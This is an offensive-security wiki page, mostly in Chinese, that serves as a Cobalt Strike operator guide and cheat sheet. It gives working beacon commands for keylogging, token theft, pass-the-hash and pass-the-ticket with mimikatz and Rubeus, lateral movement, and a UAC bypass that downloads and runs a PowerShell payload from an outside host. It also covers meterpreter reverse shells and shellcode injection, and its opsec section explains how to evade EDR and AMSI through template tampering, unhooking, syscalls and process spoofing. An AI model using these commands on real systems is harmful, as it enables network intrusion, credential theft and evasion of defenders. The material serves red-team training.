# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` 然后你可以选择监听位置、使用哪种 beacon（http、dns、smb...）等。

### Peer2Peer Listeners

这些 listeners 的 beacons 不需要直接与 C2 通信，它们可以通过其他 beacons 与其通信。

`Cobalt Strike -> Listeners -> Add/Edit` 然后你需要选择 TCP 或 SMB beacons

* The **TCP beacon will set a listener in the port selected**。要从另一个 beacon 连接到 TCP beacon，请使用命令 `connect <ip> <port>`。
* The **smb beacon will listen in a pipename with the selected name**。要连接到 SMB beacon，需要使用命令 `link [target] [pipe]`。

### 生成与托管 payloads

#### 在文件中生成 payloads

`Attacks -> Packages ->`

* **`HTMLApplication`** 用于 HTA 文件
* **`MS Office Macro`** 用于包含宏的 Office 文档
* **`Windows Executable`** 用于 .exe、.dll 或 service .exe
* **`Windows Executable (S)`** 用于 **stageless** .exe、.dll 或 service .exe（比 staged 更好，stageless 产生更少 IoCs）

#### 生成 & 托管 payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 这会生成一个脚本/可执行文件，用于以 bitsadmin、exe、powershell 和 python 等格式从 cobalt strike 下载 beacon。

#### 托管 payloads

如果你已经在 web server 上有要托管的文件，只需转到 `Attacks -> Web Drive-by -> Host File` 并选择要托管的文件和 web server 配置。

### Beacon 选项

<details>
<summary>Beacon 选项和命令</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### 自定义 implants / Linux Beacons

- 自定义 agent 只需要遵循 Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) 来注册/签到并接收任务。实现 profile 中定义的相同 URIs/headers/metadata crypto，以便复用 Cobalt Strike UI 进行下发任务和输出。
- 一个 Aggressor Script（例如 `CustomBeacon.cna`）可以封装非-Windows beacon 的 payload 生成，使操作员可以在 GUI 中选择 listener 并直接生成 ELF payloads。
- 暴露给 Team Server 的示例 Linux 任务处理器包括：`sleep`, `cd`, `pwd`, `shell`（执行任意命令）, `ls`, `upload`, `download`, 和 `exit`。这些映射到 Team Server 期望的 task IDs，必须在服务器端实现并以正确格式返回输出。
- 可以通过在进程内加载 Beacon Object Files 来为 Linux 添加 BOF 支持，使用 TrustedSec 的 ELFLoader (https://github.com/trustedsec/ELFLoader)（也支持 Outflank-style BOFs），允许模块化的 post-exploitation 在 implant 的上下文/权限内运行而不需创建新进程。
- 在自定义 beacon 中嵌入 SOCKS handler，以保持与 Windows Beacons 的 pivoting 等价性：当操作员运行 `socks <port>` 时，implant 应开启本地代理，将操作员的工具流量通过被控 Linux 主机路由到内部网络。

## Opsec

### Execute-Assembly

The **`execute-assembly`** 使用一个 **sacrificial process** 并通过 remote process injection 来执行指定程序。因为在进程内注入时会使用某些 Win APIs，而这些 API 是所有 EDR 都在检查的，所以这很嘈杂（noisy）。不过，有一些自定义工具可以用于在同一进程中加载内容：

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- 在 Cobalt Strike 中你也可以使用 BOF (Beacon Object Files)：[https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Agressor 脚本 `https://github.com/outflanknl/HelpColor` 会在 Cobalt Strike 中创建 `helpx` 命令，会在命令上加颜色，指示它们是否为 BOFs（绿色）、是否为 Frok&Run（黄色）等，或是否为 ProcessExecution、injection 等（红色）。这有助于判断哪些命令更隐蔽。

### Act as the user

你可以检查类似 `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` 的事件：

- Security EID 4624 - 检查所有 interactive logons 以了解常见的工作时间。
- System EID 12,13 - 检查关机/启动/睡眠 的频率。
- Security EID 4624/4625 - 检查入站的有效/无效 NTLM 尝试。
- Security EID 4648 - 当以明文凭据登录时会创建此事件。如果是某个进程生成了该事件，该二进制文件可能在配置文件或代码中以明文保存了凭据。

当从 cobalt strike 使用 `jump` 时，最好使用 `wmi_msbuild` 方法，使新进程看起来更合法。

### Use computer accounts

防御方通常会检查来自用户的异常行为，并且常常在监控中排除服务账户和计算机账户（例如匹配 `*$` 的账户）。你可以利用这些账户进行 lateral movement 或 privilege escalation。

### Use stageless payloads

Stageless payloads 的噪音通常低于 staged 的，因为它们不需要从 C2 server 下载第二阶段。这意味着在初始连接之后不会产生更多的网络流量，从而降低被基于网络的防御检测到的概率。

### Tokens & Token Store

当你窃取或生成 tokens 时要小心，因为 EDR 可能会枚举进程所有线程的 token 并发现属于不同用户甚至 SYSTEM 的 token。

这允许将 tokens **按 beacon 存储**，这样就不必一再窃取相同的 token。这对 lateral movement 或多次使用已窃取 token 很有用：

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

在横向移动时，通常更好的是 **窃取一个 token 而不是生成一个新的**，或执行 pass the hash 攻击。

### Guardrails

Cobalt Strike 有一个名为 **Guardrails** 的功能，可帮助阻止使用某些可能被防御方检测到的命令或动作。Guardrails 可配置以阻止特定命令，例如 `make_token`, `jump`, `remote-exec` 等，这些命令常用于 lateral movement 或 privilege escalation。

此外，仓库 [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) 也包含一些系统检查和在执行 payload 前可考虑的思路。

### Tickets encryption

在 AD 中要注意 ticket 的加密方式。默认情况下，一些工具会对 Kerberos tickets 使用 RC4 加密，而这比 AES 要不安全；现代环境默认会使用 AES。防御方若监控弱加密算法可能会据此检测异常。

### Avoid Defaults

使用 Cobalt Strike 时默认的 SMB pipes 名称通常是 `msagent_####` 和 `status_####`。更改这些名称。可以通过在 Cobalt Strike 中运行命令 `ls \\.\pipe\` 来检查现有 pipe 的名称。

此外，使用 SSH 会话时会创建一个名为 `\\.\pipe\postex_ssh_####` 的 pipe。用 `set ssh_pipename "<new_name>";` 更改它。

在 poext exploitation attack 中，pipe `\\.\pipe\postex_####` 也可以通过 `set pipename "<new_name>"` 修改。

在 Cobalt Strike profiles 中你还可以修改例如：

- 避免使用 `rwx`
- 在 `process-inject {...}` 块中调整 process injection 的行为（将使用哪些 APIs）
- 在 `post-ex {…}` 块中调整 "fork and run" 的行为
- sleep 时间
- 可在内存中加载的二进制的最大大小
- 使用 `stage {...}` 块调整内存占用和 DLL 内容
- 网络流量

### Bypass memory scanning

一些 ERDs 会在内存中扫描已知的恶意签名。Coblat Strike 允许将 `sleep_mask` 函数作为 BOF 进行修改，从而能够在内存中对 backdoor 进行加密。

### Noisy proc injections

向进程注入代码通常非常嘈杂，这是因为“普通”进程通常不执行此类操作，且可用的方法非常有限。因此，这可能被基于行为的检测系统识别。此外，这也可能被 EDR 在网络层面检测到（扫描包含不在磁盘上的代码的线程），尽管像浏览器使用 JIT 的进程常见这种情况。示例： [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

创建新进程时，重要的是要 **保持进程间的正常父子关系** 以避免检测。如果 svchost.exec 在执行 iexplorer.exe 会显得很可疑，因为在正常的 Windows 环境中 svchost.exe 不是 iexplorer.exe 的父进程。

在 Cobalt Strike 中生成新 beacon 时，默认会创建一个使用 **`rundll32.exe`** 的进程来运行新的 listener。这并不隐蔽，容易被 EDR 检测到。此外，`rundll32.exe` 通常以无参数的方式运行，这使其更可疑。

With the following Cobalt Strike command, you can specify a different process to spawn the new beacon, making it less detectable:
```bash
spawnto x86 svchost.exe
```
你也可以在配置文件中更改设置 **`spawnto_x86` 和 `spawnto_x64`**。

### 代理攻击者的流量

攻击者有时需要能够在本地运行工具，即使是在 linux 机器上，并让受害者的流量到达该工具（例如 NTLM relay）。

此外，有时为了执行 pass-the.hash 或 pass-the-ticket 攻击，更隐蔽的做法是攻击者在本地把该 hash 或 ticket **添加到自己本地的 LSASS 进程中**，然后从中 pivot，而不是修改受害者机器上的 LSASS 进程。

但是，你需要对**生成的流量谨慎**，因为你可能会从 backdoor 进程发送不常见的流量（比如 kerberos？）。为此你可以 pivot 到浏览器进程（不过将自己注入到进程中可能会被发现，所以要考虑一种更隐蔽的方式来实现）。

### 避免 AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

通常在 `/opt/cobaltstrike/artifact-kit` 下你可以找到用于生成 binary beacons 的 payloads 的代码和预编译模板（在 `/src-common` 中）。

使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) 对生成的 backdoor（或仅对已编译的模板）进行检测，可以找出是什么触发了 defender。通常是某个字符串。因此你可以修改生成 backdoor 的那段代码，使该字符串不出现在最终的 binary 中。

修改代码后，在同一目录下运行 `./build.sh`，然后将 `dist-pipe/` 文件夹复制到 Windows 客户端的 `C:\Tools\cobaltstrike\ArtifactKit` 中。
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
别忘了加载 aggressive script `dist-pipe\artifact.cna`，以指示 Cobalt Strike 使用我们想要的磁盘资源，而不是已加载的那些。

#### 资源包

ResourceKit 文件夹包含 Cobalt Strike 的基于脚本的 payloads 模板，包括 PowerShell、VBA 和 HTA。

使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) 与这些模板，你可以找出 defender（本例中为 AMSI）不喜欢的内容并修改它：
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
通过修改被检测到的行，可以生成不会被拦截的模板。

别忘了加载激进脚本 `ResourceKit\resources.cna`，以告诉 Cobalt Strike 使用我们磁盘上的资源而不是已加载的那些。

#### 函数钩子 | Syscall

函数 hooking 是 EDRs 检测恶意活动的常见方法。Cobalt Strike 允许你通过使用 **syscalls**（替代标准 Windows API 调用，使用 **`None`** 配置），或使用函数的 `Nt*` 版本并设置为 **`Direct`**，或在 malleable profile 中使用 **`Indirect`** 选项直接跳过 `Nt*` 函数，从而绕过这些钩子。根据系统不同，一种选项可能比另一种更隐蔽。

这可以在配置文件中设置，或使用命令 **`syscall-method`**。

不过，这也可能增加行为噪声。

Cobalt Strike 提供的另一种绕过函数钩子的方法是移除这些钩子： [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof)。

你也可以使用以下项目检查哪些函数被钩住： [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 或 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>杂项 Cobalt Strike 命令</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## 参考资料

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 关于 Cobalt Strike metadata encryption 的分析](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC 关于 Cobalt Strike 流量的日记](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
